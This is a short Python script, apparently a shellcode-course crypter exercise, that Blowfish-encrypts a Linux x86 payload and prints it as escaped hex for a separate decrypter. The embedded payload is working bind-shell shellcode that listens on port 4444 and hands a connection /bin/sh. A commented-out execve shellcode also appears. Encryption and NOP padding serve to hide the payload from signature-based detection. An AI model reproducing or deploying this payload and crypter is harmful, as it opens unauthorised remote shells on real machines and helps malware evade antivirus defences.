import blowfish


def main():
	print("\n")

	# shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
	shellcode = b"\x31\xc0\x31\xdb\x31\xc9\xb3\x01\x51\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x89\xc6\xb0\x66\x31\xdb\x53\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb3\x02\xcd\x80\xb0\x66\x31\xdb\x53\x56\x89\xe1\xb3\x04\xcd\x80\xb0\x66\x31\xdb\x53\x53\x56\x89\xe1\xb3\x05\xcd\x80\x89\xc3\xb9\x03\x00\x00\x00\xb0\x3f\x49\xcd\x80\x41\xe2\xf8\x31\xc9\x89\xca\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
	

	len_shellcode = len(shellcode)

	#length check
	if (len_shellcode % 8) != 0:
		print("[!] Shellcode length = %d, not a multiple of 8. Padding required." %len_shellcode)

		#calculate number of nops required
		nops = 8 - (len_shellcode % 8)
		print("[+] Appending %d NOP(s) to the shellcode\n" %nops)

		shellcode = shellcode+b'\x90' * nops

	else:
		print("[+] Shellcode length = %d, multiple of 8. Padding not required." %len_shellcode)


	crypter = blowfish.Cipher(b"sh3llc0de")
	iv = b'88888888'
	encrypted_shellcode = b"".join(crypter.encrypt_cbc(shellcode, iv))

	# raw_shellcode = 
	print("\n\n")
	print("[+] Blowfish encryption completed. Printing encrypted shellcode to be fed to decrypter:\n")
	print(encrypted_shellcode)
	print("\n")
	# print(raw_shellcode)	
	crypted = ""
	shell_array = bytearray(encrypted_shellcode)

	for x in bytearray(shell_array):
		crypted += '\\x'
		crypted += '%02x' % x

	print("[+] Raw encrypted shellcode:")
	print(crypted)

if __name__ == '__main__':
	main()
